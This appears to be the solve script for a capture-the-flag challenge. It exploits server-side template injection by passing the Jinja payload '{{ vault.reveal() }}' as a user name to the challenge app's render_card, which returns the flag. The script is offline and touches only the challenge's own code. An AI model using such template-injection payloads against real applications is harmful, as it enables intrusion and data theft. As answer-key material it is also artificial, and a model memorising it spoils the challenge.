#!/usr/bin/env python3
"""SSTI: feed a Jinja payload as `name` and let render_card evaluate it.

Offline. We import the shipped app source and call its render_card with an SSTI
payload; because `name` is concatenated into the template source, the payload
executes and returns the flag from the exposed `vault` global.
"""

import importlib.util
import os
import sys

sys.dont_write_bytecode = True  # keep the challenge dir free of __pycache__

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

# The malicious `name` value.
PAYLOAD = "{{ vault.reveal() }}"


def load_app():
    spec = importlib.util.spec_from_file_location(
        "card_app", os.path.join(ROOT, "app.py")
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def main() -> None:
    app = load_app()
    rendered = app.render_card(PAYLOAD)
    # rendered == "Dear <flag>, welcome to Lome!"
    flag = rendered[len("Dear ") : -len(", welcome to Lome!")]
    print(flag)


if __name__ == "__main__":
    main()
